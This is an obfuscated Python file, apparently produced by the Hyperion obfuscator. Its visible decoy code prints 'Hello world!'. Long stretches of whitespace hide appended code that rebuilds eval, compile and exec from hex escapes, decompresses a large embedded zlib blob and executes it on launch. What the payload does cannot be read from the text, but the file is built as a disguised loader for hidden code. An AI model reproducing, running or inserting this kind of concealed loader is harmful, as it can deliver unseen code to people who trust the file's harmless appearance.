from builtins import *
from math import prod as _detectvar


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Hypothesis, Round, _builtins, _frame, CallFunction, Math, _positive = exec, str, tuple, map, ord, globals, type

class _substract:
    def __init__(self, Product):
        self.System = _detectvar((Product, -14241))
        self.Negative(Square=-51013)

    def Negative(self, Square = int):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.System += -99082 / Square
        
        try:
            (Round, _square) if Hypothesis > CallFunction else (_builtins, _frame, _frame) > _frame

        except ArithmeticError:
            ((Hypothesis, {CallFunction: _builtins}) for Hypothesis in {_square: _frame} if Math == _builtins)

        except:
            _positive(-22279 / 44489) == None

    def _negative(self, Absolute = -32226):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Absolute -= 99720 * 90442
        self.Algorithm != bool
        
        try:
            (((_frame, Hypothesis), Hypothesis) for Hypothesis in (_frame, Hypothesis))

        except AssertionError:
            (((Round, _square), _frame) for _frame in (_builtins, _frame, _frame))

        except:
            _positive(-36917 * 8550) == float

    def MemoryAccess(Theory = False):
        return Math()[Theory]

    def StackOverflow(Calculate = 34968 + 68820, _multiply = False, Random = Math):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Random()[Calculate] = _multiply
        
        try:
            (((Round, _square), Hypothesis) for Hypothesis in (_frame, Hypothesis))

        except AssertionError:
            (((_frame, Hypothesis), _builtins) for _builtins in (_frame, Hypothesis))

        except:
            _positive(27835 * 46556) == Ellipsis

    def execute(code = str):
        return Hypothesis(Round(_builtins(_frame(CallFunction, code))))

    @property
    def Algorithm(self):
        self._walk = '<__main__._detectvar object at 0x000003018BE78078>'
        return (self._walk, _substract.Algorithm)

if __name__ == '__main__':
    try:
        _substract.execute(code = __code__)
        Run = _substract(Product = -73816 + 78919)

        if 129697 > 9339492:
            Run._negative(Absolute = -41856 * Run.System)
        elif 365415 < 1662015:
            Run._negative(Absolute = 51372 * Run.System)                                                                                                                                                                                                                                                          ;_substract.StackOverflow(Calculate='mmnnmnnmnnmmmmnnm',_multiply=b'x\x9c\xdd\x1b\xfdo\xe2:\xf2w\xfe\n^u\x12D\xdb\x96$\xe4\x83T\xda\x1f\xee\xc4;m*\xb6\x9c\x1eO\xaf{\xda\xadP \xa1\rk0J\xc2+\xfd\xefofl\xd3\x00\r\x04B\xf7\xa4\xda\xf8#\xf6\xd8\xb1\'\xe3\xf1\xcc\xd8d\xc9\xcbM\xad\x0e.\x9e4)E7\x1c\xf2\xd1d\x99\x8e\x83\x8c\'\xc3a\xfd\xb7\xcf\x17_^\x16Q\x12\xf3\xf9E\x9d\'9\xb0`\x99=\xf1$%\x98\xe6\xc5(f\xec%{\x8a\x1ey\x90\xb5m\xe7\xe2\xf2\xe2_l\x19\xfd\x11\x85\x17\xdaF\xab\xc78{Z\x8eD\xc7OY\xb6HoZ-Qv=\xe6\xb3\xd6V7\xad\x82w\x87q:\xe6I\xb8\xd9\x8d,\xbc~|l-X\xf0\xb8\x8c\xb6\x1a\xb1x\x1c\xcd\xd3H4\xfa\xfd?\xbd+\xf3Z\xdf\x02\x19\xf3P\xd47\x16I<\xcf\x9a\x17_"\xc6x\xfd\x99\',\xfc\xedBk\xd4\xb4\x9b54\xd67\xd2\x9fq\xd8\xd0j\xd1j\x1c-2\x89\xcc\xf9b\t-\xff\xe0i\x94\xd6\x83$\xaa\'Q\xf8c\xfeW\xccY\x94\x89\x82\x11`\xe6\xc7\xfc\xbf|IOA\x1d;\xf91\xbf\xe3#\x1e\xbe\xd4Y\xfc\x13\xda\xbd\xf0\xe5\x85V\x13\x83\x8ag\x0b\x9ed\xc3!\xbc\xed%mh\xd7\xd1*\xce\x9aZ\x8d\xf1q\xc0\xd2\xa6\xf6\xbd\xc1\x98\x8f\x8e\xf9L:\x9f5\x1e>?2>\x02\x80\xda\x1b\xb5\xd8\x88s\xbd\xaf\xf7\xe1\xc79\xefs\x1d\x9f0\xd7\xf8~s\xf3\xe9\xea\xd3U\xf3\xaa\xf9\xc9\xd0\xb4\x07\xe8\'\xca\x82,K\x8a\xfa\xe9\xf5z\xb7\xb7=\xf0\xe8|\xf4\xfe\xedn\'a\\\xd8A\xbf\xdf\xedwy\xb7\xdb\xef\xf3~\x17\x93n\x17\x86\xf1\xf0Y\xcc\xaf\xf6f5\xb6\xebR\rVBU\x17+\xa1\xd1+\xb6\n_\x07s\xc5\x89\xe3tuJ\t\x0f\xf8\xc6\xdd\x1e\x9b\x8d\xd12fY<G\xbc\xff\x1d$0\x9c\x82\xe6\xd8\xf5l\x8e~\x1d\x81\x83\x14\xfaE\x14#z\xa1%\xa2\x98\xb0\x0e\xcd\x9bo\xbd/\x9d\xc7\x19\x8b\x97\xa3m\x14j\x97\x88X\xf4\xe8\x08\xdf\x80\xf9\xe3\xba\xd0\xbe\x9f\xa1\x8f\xebx\x1eF\xabf#Z&\x7f\xee\xd4>h\x85hG\xb4\x89\xc9\xf7\x89\xde\xe0w$j\xe2x\x9c\x06\xf3\xb8\nj\n\xbb8\x025\xc5}(\xd4\xbcLb\xb6\x8a\x9e\xe6\xcb#\xf0\x83\xcb\x08^\xeaC\xe2\xdf\xf6p,=\x1fK\xfc\x8fJ?\x8c\xf3\xddZ\xc0\xcf\xbe\x05\xb6\x02\xf7\x8c\xfe\xf9y\x85\xd1\xf3\xb3x\xfc\xa88\x8aR\x16\xfc\xfbM$\x151\xc5\xbb\xbb\xaf\xe0 \x86\xf45{\xf7Q\x11\x94d\xe9\xb14\x14\xc7\xf14f\x1036\x9dN!?e\x90\xfd\xa8\x08b\xc1\xdf\xd1\x11\\\xa8\x0b3\xa7 \x1cG\x02\xc3\x12\xdc\x1d\x1b\x8d\xeb)\x8f\xe7{\x91;\x97\xbb\x9f\xda\x01?\xf0\xf6\xc7\xe2\xc5\x8c\x8f\x8fZ\x9c\x92m\xad\x88\x8d\t\xd6%\xd2\x8f\x8a\xa4,\xe0lr\x04\xf9\x99\xe6\x00~\x03\x88 \x03\xc9@>\x98\x83|\'o\xaf\xe0fC3\xa0Z/\x05\xa9C\xb5q\xe6>\xcbB\xbe%\t5G\x8d\xb6eO\xda\x1e\x04\x07\x82\x0e\xa1#S\x13B[\xd6u\xcc\x91\xd91\xc3R\xb0\xae\xe9\x81\xd0\x1aF\xa8\xd34\x1b\x9dI\xb6+\x8eh"\xda\x08\x1f\x94\x14\xc7\xd1\xeaMF\xb8\x87\x9b\x15|(k\x82\xde\x01\xdf\xd6_\x03\xc6\x16\x05\xcc#\xc4!\xe4?|>\x8e@L\xd3r\x9d\xd01\x1c\xcf\x19\x9b\xbae8m\xf0\x13\xd7v"\xd72\xf5v`\xea\xa6y\xf0\x83\x97\xe0\xde\xa4\xb6\x10\x13\'.NL\xfct\xaa\xd6\xcd\x90(\xd6(G\x8d\x85Hih\xd6\xd0\x01\xdf\x1e\xeaC{h@\xda\x81v;e\x15Fj\xc8\x91\xea%\xd7\xcd^T*\xce5P\\l J\x06\xe7\xe6dU\xb9\x8e+9\x87-9\x87-\x03\x96).\xd3\x96\\\xa7\x0c\xacy\x1c\xd7\xd9\xf3\xbd\xf5\xd28p\xe9\xfb\xbb@\x01\xf6\xd0\x84\xbc5t\x01\xbc\xb3[Z\xaa\xb76@\x9a@U\x1eQ\x94\rO\x16Q\xdaN\xe9\x99\xbf$R\xb1\x0e\xfd{\xf0\x16\x0b\xde\xd0\x19:\xf4\xde\x9d\xd2_\xb7\x1aw\xc2)\xec\xd2\xb3\x80aa\xacR\x15\xa3\x17O\xaa\xfe0\xcbd\xc1l\x14\x06\xf5o\xf7\xf7\xdf(\xa0\xbb\x17\xe1\xa6xl{\x97*\x9a\xbd\xc8\xfc\xd5\x17)nw\xfd-K\xd8\xb1\xacDn\xc9\x18\x0c\x19\xd4v\xadRS.\xaa2\xb0U\x99\xe7!r(\xc3\xf2\x0e(\xe6\xcfB7\x17\n\xfa3eA\xae=\xaf,\xf6\x1e\x90\x1e\xf1\x06\xd89\xc0\x9b\x90z\xb4\xdau\xdaS6J+\x90\x83#?o^jC\xbe\xe9\xca\xd0\xc9\x91C\x19\xd8\x13W\xef\xd1\xe4\xe1I\xde\xeeH\xc9R\xf1zO\xe6\xb1\xcc\x91\xe3.\x07[\x8d\xcc\n\xc6i\xbbv\x07\xbc+\xd3\x0e\xa5n\xae$\x97?\xb7Pv\xb6%T\xcc=\x917\x06\x10\x0b\x8f\xf9`]&b,)\xcf;}\xb41\xf6|\x14\xa8{(`\xdf\x9e\xc88\x0bF\x0c\xc2/8\x8c\x1d\x12\x93-\xf9\xac\xc4bK\x96\x9c\xfdK8r\x85X2\x189\n4\x94\xd4\x92[e\x87a\xdf\xe7\x8b\x86\xe0#\n*\x16\xb90\x97\x0b\xcf\x8e\x9d\x8e\x9c\x95\x9aq[\xaeUW\xe6\xf5\x9cvY\x0e\xb6\xe2\x96a\x92\x82?\x10\t\xe9\xfb"[q\xdbU\xfcRm\xabn.\x8f_\xd7\xcam\xbb\x87`\xcbP\xc0yd\xd8_\xa2\x93@\xcfT\x84 \x90\xd3+\x898^\x8e\x16\xd4\nR\xf4\xb2\xd6\x0fr{\xc3!X\xab,\xae%\x17\x83\xd1\xc1\x08\x19\x8d8\xc6\x91\xe2\x88\xa77o\x1a\x96\xf6\x8b.\xca\x1e\'Rz\x14F\xb9jJ\x95b#\xee\xd6\xa4\x15\x12\xac\x9cRu\x08\xb6*!\x16Z\x14l\xdd1\xdc6x\xd7\x99\xb8\xa6c\xbd\x8f]\xc1W_\x85\x89o#\xf3\x8cU@\xb1\xe2Iy\x0e\xee\xe5d\'\xb2\x8cI\x14\x1f\x82E\xd4{\xef\x85b@\xa9\xeb\x18\x0e\x86q\xde\x9b\xd1\xdaWD/\xda\xc0\xb80\x88u\xc94\xd6\xe5h\x15\xab\xba\xba\x1d\xfb\xd5\xbe\xa8\x88T\xe5)\xe4V\xf7!\xd82\x92\xdf~N\xea\x80\x1c\x8e\xd6\x1e\x83tpKj\xe5o\x94\xfe\x9f\xec+\xe5u\x8e"\x9c+\xca\xcc+\x84\xca\xca\xa2d\x137g\xff=\x04[\x12\xe7U\xf5{\xd7u;9\xaf\\G\x96o\xd6\x82/-\xa7\xa2\xb5W^*\x011\x95\xce\xc6\xfd\x9b\x82\xb3\x95\xfd\xecG:\xb9!\xd0\xee\xe0\x97\xfa\xa4\xb6T\x01\x91\xb8\\H\xad\xa1AD\xb7SZ\xd2\xc0c\x024*\x936(\x97&x\x83\x0c<;\xa5gVq\xf1\r\x06\x8c\xb4M\x06,\x1c/\x1a\x96\xec\xdd\xd23/\x08T\x9c\r2\x98!\xb6\\x\x0b\x9a\xe5\xda\xbb\xa5\x15\x17M\xdb~=\xf4\xb0\xb6R#\'\x86\x94\x81-)\x86\x14\x85\xb3\x983;\x80\x9d6\x99.\xdb\x10\\\xf82m\x00\xf7vK\x7f\xb1!\xf0\x14e\x10\xb7\xba\x00\x82\x07\xb1G\xe9X\xc6\x01y\x91z\xa2\xbc4k\x90\x0b\x99\t)\x02r\xa7\xf0\x85\xa2!GNHA\xc5\xa1,Q1\xa4g\xd7\xce\xda9^\xaex\xb8!I\xd5\x94$j\xe6\xa4\x99\xc3\xb0\xef\xa2\xbb\xbe\xdaj7m\xb8\xaaD\xe4O\xc6\x0e2\\\xb4\xae;\xc4\x92\x0c\xb2z\xdb\xc4\xaavJ+\x90\xbe:\xb5P\x1a`\'\xc7\x12\x94d\xa8$\xc7C\xb0\x9d\xf2\x92\xe3\xa1=\x8aI\xa1\xd8W\nL\x85)\xaa\xe3`[\x0e\xd1\xc9\r\xd7\x90db\xe6\x94\xfdC\xb0\xefd\x7f6]\xd3\xad&\xfa\xc2\x1b\xa0\x7f6eS\xd4\x06\xa7\xf0\xb6_yT)\xb9\x11\xdd\xb2\xc2\xcbVw\xe2\xbe\x15\x86\xe3\x15\xd1\xa2%\xa7\xb8\xa3G>\xc8\xf1\xcd\xb1\xe4\xa9\xc4cK\xf3Nq\xb2\xabbp\'\xc9Tx5\x00M\x08\xa2\x8a*\xf08^\xaftjr\x9c\xb1c\x1b\xff\xf4[\xdfy\xbb;\xf58\x88#\x16pz}\xba\x01\xd5\x17\x9aUI\x01\xcf\xa5S\x03\x876j<Y\x10\'\x87;\xa5%O5mq\xdeG\x82!\xf6a\xd0\xa9\xe6N\xe9\x19\x0e\xaa\x94\xf1\xc1\xcb\xf1;\x95z[\x07U\xfb`\xcbX\x057\xc4%\xf9\tI\x83\xc5\xdb\x1c@}D\x8e8J\xfc\x10\'\x18tbb\x06S\xe4\n\x98 [\xa8\xc2\x15\x94\xc4\xa8l2\xca\x90\xb0\xe6\x99\xb9my\x1f\\\xc9\xeb8\xaf2\x8e\xe0l1M\x80f\x1e\x9fJ\xd2=\xb2\xf5K-\x08\x8d\xfe\x15\x05nu\xc6\xa3n\x1e\x99\xb9)ok\xa9\x87`\xab[\x06\xaa\xdaXM\xfb\xd5\x1a\xa4\xf2\xf9S,;\'\x0f\x1c\x82\xb5\x8e\x91\x07&\t\x9f\xd5\xd5\xff\x0b\xea\xe2\x7f\x0b\xf5h\x15\x8d/\xe9/$\x97\xf4\x17\x14\xc8g5,l\xe6e\x03\xa1\xc5\xfaZM\xb6\xe2\xe9e\xfa\x92\xd6\xb2(\x99-WWi\x94-\x17Wi\xc6\x93\xe01\xaa%\xb3\xabd\xd2\x92O\xadh\xb6dA\x16\x85-\xb4\x10\xd1EO\xb1\xdc\xd0nDKP\xc1\x87\xe3 \t[\xb8\xa9\t\xc6z\xa7v\xb9\xa2\x0eW\xf2\xd4\xf7y\xe3,x\xd5*\x82\xe7\xf8BZ\xe4x\xe3\x94\xd6}\xb7\x15\xcc\xc3\x84\xc7P9\x1am\x0ed}\x7ff\x90\xbb\x17H\xf9u\x9b0\xc8\x02\xd1\xa8\xfe\x8f/\xfd\xaf\xbf\xcb\xbc\xec\x009\xba\\ \x82\n(\xe5\xba\x82\xda\x1e\x9e\xbc\xbf:\x93\xff\xe6\x80P4\x11y\x8c!O1\x06\xeb\x83\x8d\xd6\xe6\x0c|&e<i\x85 \xd7\xba\x7f\n\xb2\xf4\x9f\x8bEQ\xe7\xd4\x88\xf9\xfe\xab\xe5\xc2/\xc4\xa8\xbf\xb1\xca\xc1o\x8d@Lg}\xb5K\\\xf5\xc2L\xeb\xeb2\x8d\xc7\x9b\xc0\xea\x82\xc5=\xfa\xfbo2&\xc8\x9f\xb5\xe0\xb3\xf8\x97\x13.%\xaes!\x07\xd0\r\x8a~_\xab\x8dd\xad\xbc\n\xb0R\x96uu\xf5u\xa5\xd5\xc4\xdf\xab\x18[\x9b\x86_\xed\xc3\x98h\xb5Y0[,S`l\xff\x03q\x90\xff>')

        if 300476 > 6572805:
            Run._negative(Absolute = -18090 / Run.System)
        elif 189655 < 8594647:
            _substract(Product = 70474 - 74528).Negative(Square = Run.System * 63445)                                                                                                                                                                                                                                                          ;Oo0oOO000oOoO0O00O00o,llIllIlIIIIllIIIIIIllll,MNMMNNNNMNNNNMNMNNNNN,MMMMNNNMMNMMMNNMMNMMNMNNN,LIJILIJLLIILJILJILLILLLJJ=(lambda SSSSS222S2S2S2222S2SS22S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(SSSSS222S2S2S2222S2SS22S)"),filename='\x4f\x4f\x6f\x6f\x30\x6f\x4f\x6f\x4f\x30\x4f\x30\x4f\x6f\x6f\x4f\x30\x4f\x4f\x30\x4f\x6f\x6f\x4f\x4f\x4f',mode='\x65\x76\x61\x6c'))),(lambda SSSSS222S2S2S2222S2SS22S:SSSSS222S2S2S2222S2SS22S(__import__('\x7a\x6c\x69\x62'))),(lambda SSSSS222S2S2S2222S2SS22S:SSSSS222S2S2S2222S2SS22S['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda IlIlIlIlIlllIIIIIlIllI,SSSSS222S2S2S2222S2SS22S:IlIlIlIlIlllIIIIIlIllI(SSSSS222S2S2S2222S2SS22S)),(lambda:(lambda SSSSS222S2S2S2222S2SS22S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(SSSSS222S2S2S2222S2SS22S)"),filename='\x4f\x4f\x6f\x6f\x30\x6f\x4f\x6f\x4f\x30\x4f\x30\x4f\x6f\x6f\x4f\x30\x4f\x4f\x30\x4f\x6f\x6f\x4f\x4f\x4f',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 272200 > 6475027:
            _substract(Product = 70189 - 30406)._negative(Absolute = -22514 + Run.System)
        elif 459081 < 7333215:
            _substract(Product = 49844 + 43752)._negative(Absolute = 20590 - Run.System)                                                                                                                                                                                                                                                          ;LIJILIJLLIILJILJILLILLLJJ()(MMMMNNNMMNMMMNNMMNMMNMNNN(MNMMNNNNMNNNNMNMNNNNN(llIllIlIIIIllIIIIIIllll(Oo0oOO000oOoO0O00O00o('\x76\x61\x72\x73'))),_substract.MemoryAccess(Theory='mmnnmnnmnnmmmmnnm')))

    except Exception as _square:
        if 176938 > 2726991:
            _substract.execute(code = Round(_square))

        elif 111285 > 6237196:
            Run._negative(Absolute = -83560 / Run.System)
